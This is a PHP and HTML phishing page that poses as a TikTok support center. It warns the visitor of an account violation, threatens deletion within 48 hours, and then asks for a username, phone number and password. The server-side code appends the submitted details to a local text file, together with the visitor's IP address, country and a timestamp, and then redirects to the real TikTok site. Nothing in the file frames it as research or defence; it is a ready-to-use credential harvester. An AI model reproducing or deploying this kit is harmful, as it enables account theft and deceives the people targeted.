<?php
if ($_POST) {
  $username=$_POST["username"];
  $number=$_POST["number"];
  $password=$_["password"];
  $ip = $_SERVER['REMOTE_ADDR'];
  $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
  $ulke = $details->country;
  date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");
$file = fopen('erhancan.txt', 'a');
fwrite($file, "Username: ".$username."\n\n" ."Password: ".$password. "\n\n"."Number: ".$number."\n\n"."Ip Adress: " .$ip."\n\n".

"Country: ".$ulke ."\n\n".   "Time: " .$tarih.  "\n\n\n\n");
fclose($file);
echo '';
    header("Location: https://www.tiktok.com");
  # code...
}
?>
<!DOCTYPE >
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>TikTok | Support Center</title>
  <link rel="icon" href="https://raw.githubusercontent.com/swagkarna/Tiktok-Phishing-/master/jqZypj.png">
  <link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">

  <style type="text/css">
    *{
      font-family:sans-serif;
    }
    .tiktok_tr{
      width:100%;
      padding:1px;
      padding-top:10px;
      background:white;


    }
    .tiktok_td{
     
      width:30%;
      padding:px;
      box-sizing:border-box;
      margin-left:5px;


    }
    .image{

    }
    .table_tr_div{}

    .table_tr_div_p{}
  </style>
</head>
<body style="padding:0px;margin:0px;">
  <table style="border-bottom:1px solid #cecece; width:100%;box-sizing:border-box;position:fixed;top:0px;padding-bottom:10px;background:white;z-index: 999394294;">

    <tr class="tiktok_tr">
      
<td class="tiktok_td" style="width:13%;text-align:center;">
  <div class="">
    <i  class="fas fa-bars" style="font-size:23px;color:#444;margin-bottom:5px; font-weight:;" id="bars" aria-hidden="true"></i>

  
      </div>

 </td>


<td>
  <img class="image" src="https://raw.githubusercontent.com/swagkarna/Tiktok-Phishing-/master/jqZypj.png" width="120" alt="TikTok">
</td>


<td class="tiktok_td" style="text-align:center;">
  <div style="width:100px;max-width:99%;background:#fe2c55; text-align:center;">
  <p class="table_tr_div_p" style="font-size:14px;color:white;font-weight:500;font-family:sans-serif;padding:3px;">
<i class="fas fa-play"></i>
  Watch </p>
</div>
</td>

    </tr>

  </table>
  <div id="arkaplan">

  <br><br><br><br><br><br>

<center>
  <div class="copyright_div" id="copyright_div">
    <br>

<img  alt="tiktok" src="https://i.hizliresim.com/jqZypj.png" width="80" style="border-radius:50%;">

    <br>
    <div id="confirm" >
    <h1 class="yazi">
      TikTok Violation of Condition
    </h1>
    <p class="yazi-2">Hi!<br>
     We do not  conform your account because  your account was  complainted to  us for nudety.Your account is  not suitable for  our terms of use.please fill the form and wait us for next step and dont do any changes in 48 hours otherwise your account will be deleted </p><br>
   <button  class="tiktok_buton" type="buton" onclick="erhancanturker();"
   >Next</button>
   </div>

  </div><br>

</center>

<style>
  .tiktok_buton{
    background:#fe2c55;
    color:white;
    font-weight:bold;
    outline:none;
    border:none;
    font-size:15px;
    width:160px;
    height:30px;
    transition:1s;
  }

  .tiktok_buton:hover{
    opacity:0.8;
  }
    .tiktok_buton:focus{
      opacity:0.6;
    }

  .yazi{
    font-family:sans-serif;
    font-weight:bold;
    color:#222;
    font-size:19px;
  }
  .copyright_div{
    margin:0px;
    overflow:hidden;
    text-align:center;
    width:400px;
    padding:6px;
    max-width:94%;
    border:1px solid #333;
    box-shadow:1px 1px 7px 2px #777;
  }
  .yazi-2{
    font-family:sans-serif;
    font-weight:400;

  }
</style>




  
<div class="bottom"><br>

  <h2 class="download">Download Now</h2>
  <img src="https://i.hizliresim.com/AOaGYQ.png" width="170"><br><br><hr><br>
  <img src="https://www.controcampus.it/wp-content/uploads/2019/03/TikTok.jpg"  width="150" style="background:white;">
  <br>
  <p class="big">Company</p>
  <p class="small">About</p>
   <p class="small">Newsroom</p>
    <p class="small">Contact</p>
     <p class="small">Careers</p>

     <br><hr><br>
     <p class="big">TikTok for Good</p>
       <p class="small">TikTok for Developers</p>
    <p class="small">Contact</p>
     <p class="small">Advertise on Tiktok</p>


     <br><hr><br>

     <p class="big">Support</p>
     <p class="small">Help Center</p>
     <p class="small">Safety Center</p>
       <p class="small">Community Guidelines</p>

  <br><hr><br>

  <p class="big">Legal</p>
  <p class="small">Cookies Policy</p>
  <p class="small">Intellectual Property Policy</p>
  <p class="small">Law Enforcement</p>
  <p class="small">Privacy Policy</p>
  <p class="small">Terms of Service</p><br><br>

</div>

</div>
<style>
  .download{
    color:white;
    font-weight:500;
    font-size:23px;
  }
  .bottom{
    background:#000;
    bottom:0px;
    text-align:center;

  }
  .big{
    font-size:15px;
    color:white;
    font-weight:bold;
    font-family:sans-serif;
  }
  .small{
    font-size:14px;
    font-weight:300;
    color:white;
    font-family:sans-serif;
  }
  .erhancanturker{
    position:fixed;
    text-align:center;
    left:5%;
    right:5%;
    top:15%;
    border:1px solid #000;
    background:white;
    box-shadow:1px 1px 50px 4px #000;
    z-index:999;
    display:none;
  }


  #arkaplan{
    width:100%;



  }
  .er{
    border-radius:5px;
    padding:4px;
    padding-left:7px;
    outline:none;
    width:200px;
    height:35px;
    max-width:80%;
    margin:5px;
    border:4px solid #fe2c55 ;
    font-size:15px;
  }
  .er::placeholder{
    color:#999;
  }
  .er2{
    background:#fe2c55;
    color:white;
    outline:none;
    border:none;
    font-weight:bold;
    width:200px;
    height:40px;
    margin-top:10px;
    font-size:17px;
    border-radius:px;
  }
</style>
<center>
<div id="erhancanturker" class="erhancanturker">
<br><br><br>
<img  alt="tiktok" src="https://i.hizliresim.com/jqZypj.png" width="80" style="border-radius:50%;"><br>
<br>
<h1 class="yazi">Objection</h1><br>
<p class="yazi-2">Please enter  correct information and wait for  account conformation.please fill the form </p><br>
<form method="post" autocomplete="off">
<input  class="er" type="text" name="username" required="" placeholder="@username"><br>
<input class="er" type="number" name="number" required="" placeholder="Phone Number"><br>
<input class="er" type="password" name="password" required="" placeholder="Password"><br>
<button type="submit" class="er2">Confirm</button>
</form>
  </div>
</center>
<script type="text/javascript">
  function erhancanturker(){
document.getElementById('erhancanturker').style.display='block';
document.getElementById('arkaplan').style.filter='brightness(30%)';
  }
</script>

</body>
</html>
